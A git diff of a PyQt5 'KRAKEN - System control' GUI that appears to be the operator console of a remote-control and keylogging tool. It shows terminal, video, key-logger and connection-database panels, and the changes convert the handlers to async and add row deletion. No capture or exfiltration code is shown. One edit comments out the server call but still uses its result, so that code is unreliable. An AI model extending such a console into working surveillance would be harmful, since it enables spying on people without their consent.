@@ -1,10 +1,13 @@
 import sys
 import sqlite3
+import asyncio
 from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                              QPushButton, QTextEdit, QLabel, QScrollArea, QTableWidget, 
                              QTableWidgetItem, QLineEdit)
 from PyQt5.QtCore import Qt
-import main.server as server
+from PyQt5.QtGui import QIcon
+from qasync import asyncSlot, QEventLoop
+
 
 class MainWindow(QMainWindow):
   def __init__(self):
@@ -12,6 +15,11 @@ class MainWindow(QMainWindow):
     #! Основные настройки
     # Настройка основного окна
     self.setWindowTitle("KRAKEN - System control")
+
+    # Иконка приложения
+    icon_path = "img/imgReadme/kraken.jpg" 
+    self.setWindowIcon(QIcon(icon_path))
+
     # x, y, width, height
     self.setGeometry(200, 100, 1200, 700)
 
@@ -112,7 +120,8 @@ class MainWindow(QMainWindow):
     self.server_running = False
 
   #! Терминал
-  def show_terminal(self):
+  @asyncSlot()
+  async def show_terminal(self):
     """
     Отображает интерфейс терминала.
     """
@@ -129,7 +138,8 @@ class MainWindow(QMainWindow):
     self.terminal_input.returnPressed.connect(self.execute_command)
 
   #* Обработка команд
-  def execute_command(self):
+  @asyncSlot()
+  async def execute_command(self):
     """
     Обрабатывает ввод команды в терминале.
     """
@@ -152,7 +162,7 @@ class MainWindow(QMainWindow):
     else:
       if self.server_running:
         # Отправляем команду на сервер и получаем ответ
-        response = server.start_server("127.0.0.1", 65432, command)
+       # response = server.start_server("127.0.0.1", 65432, command)
         self.terminal_output.append(f"Команда: {command}\nОтвет: {response}\n")
       else:
         self.terminal_output.append("Сервер не запущен. Введите 'connect' для запуска.\n")
@@ -161,7 +171,8 @@ class MainWindow(QMainWindow):
 
 
   #! Видео
-  def show_video(self):
+  @asyncSlot()
+  async def show_video(self):
     """
     Отображает интерфейс для видео.
     """
@@ -173,7 +184,8 @@ class MainWindow(QMainWindow):
     self.content_layout.addWidget(self.video_label)
 
   #! Key Logger
-  def show_keylogger(self):
+  @asyncSlot()
+  async def show_keylogger(self):
     """
     Отображает интерфейс для key logger-а.
     """
@@ -185,7 +197,8 @@ class MainWindow(QMainWindow):
     self.content_layout.addWidget(self.text_display)
 
   #! Информация
-  def show_info(self):
+  @asyncSlot()
+  async def show_info(self):
     """
     Отображает интерфейс для информации.
     """
@@ -220,14 +233,16 @@ class MainWindow(QMainWindow):
     """)
     self.db_connection.commit()
 
-  def show_database(self):
+  #* Отображение
+  @asyncSlot()
+  async def show_database(self):
     """
     Отображает интерфейс для базы данных.
     Заполняет таблицу данными из SQLite.
     """
     self.clear_content()
 
-    # Создаем контейнер для полей ввода и кнопки
+    # Создаем контейнер для полей ввода и кнопки добавления
     self.input_container = QWidget()
     self.input_layout = QHBoxLayout(self.input_container)
 
@@ -249,6 +264,24 @@ class MainWindow(QMainWindow):
     self.input_layout.addWidget(self.port_input)
     self.input_layout.addWidget(self.add_button)
 
+    # Создаем контейнер для удаления строк
+    self.delete_container = QWidget()
+    self.delete_layout = QHBoxLayout(self.delete_container)
+
+    # Создаем поле ввода для номера строки
+    self.delete_input = QLineEdit()
+    self.delete_input.setPlaceholderText("Номер строки")
+    self.delete_input.setFixedWidth(100)  # Ограничиваем ширину поля ввода
+
+    # Создаем кнопку "Удалить"
+    self.delete_button = QPushButton("Удалить")
+    self.delete_button.clicked.connect(self.delete_from_database)
+
+    # Добавляем поле ввода и кнопку в layout
+    self.delete_layout.addWidget(self.delete_input)
+    self.delete_layout.addWidget(self.delete_button)
+    self.delete_layout.addStretch()  # Добавляем растяжку, чтобы кнопка была слева
+
     # Создаем прокручиваемую область и таблицу
     self.scroll_area = QScrollArea()
     self.scroll_area.setWidgetResizable(True)
@@ -256,15 +289,17 @@ class MainWindow(QMainWindow):
     self.table_widget = QTableWidget()
     self.scroll_area.setWidget(self.table_widget)
 
-    # Добавляем контейнер с полями ввода и таблицу в layout
+    # Добавляем контейнеры с полями ввода и таблицу в layout
     self.content_layout.addWidget(self.input_container)
+    self.content_layout.addWidget(self.delete_container)
     self.content_layout.addWidget(self.scroll_area)
 
     # Обновляем таблицу данными из базы данных
-    self.update_table()
+    await self.update_table()
 
   #* Добавление данных в базу данных
-  def add_to_database(self):
+  @asyncSlot()
+  async def add_to_database(self):
     """
     Добавляет данные из полей ввода в базу данных.
     """
@@ -291,10 +326,45 @@ class MainWindow(QMainWindow):
     self.port_input.clear()
 
     # Обновляем таблицу
-    self.update_table()
+    await self.update_table()
+
+  #* Удаление строки из базы данных
+  @asyncSlot()
+  async def delete_from_database(self):
+    """
+    Удаляет строку из базы данных по указанному номеру.
+    """
+    # Получаем номер строки из поля ввода
+    row_number_text = self.delete_input.text().strip()
+    if not row_number_text:
+      print("Введите номер строки")
+      return
+
+    try:
+      row_number = int(row_number_text)  # Преобразуем в число
+      if row_number < 1:
+        print("Номер строки должен быть больше 0")
+        return
+
+      # Получаем список ID из базы данных
+      self.cursor.execute("SELECT id FROM connection_table")
+      ids = [row[0] for row in self.cursor.fetchall()]
+
+      # Проверяем, что номер строки корректен
+      if 1 <= row_number <= len(ids):
+        # Удаляем строку из базы данных
+        self.cursor.execute("DELETE FROM connection_table WHERE id = ?", (ids[row_number - 1],))
+        self.db_connection.commit()
+        await self.update_table()  # Обновляем таблицу
+        self.delete_input.clear()  # Очищаем поле ввода
+      else:
+        print("Номер строки вне диапазона")
+    except ValueError:
+      print("Ошибка: введите корректный номер строки")
 
   #* Обновление таблицы
-  def update_table(self):
+  @asyncSlot()
+  async def update_table(self):
     """
     Обновляет таблицу данными из базы данных.
     """
@@ -311,7 +381,6 @@ class MainWindow(QMainWindow):
     for row_index, row_data in enumerate(data):
       for col_index, col_data in enumerate(row_data):
         self.table_widget.setItem(row_index, col_index, QTableWidgetItem(str(col_data)))
-
 
   #* Закрытие базы данных
   def closeEvent(self, event):
@@ -331,6 +400,11 @@ class MainWindow(QMainWindow):
 
 if __name__ == "__main__":
   app = QApplication(sys.argv)
+  loop = QEventLoop(app)
+  asyncio.set_event_loop(loop)
+
   window = MainWindow()
   window.show()
-  sys.exit(app.exec_())
+
+  with loop:
+    loop.run_forever()
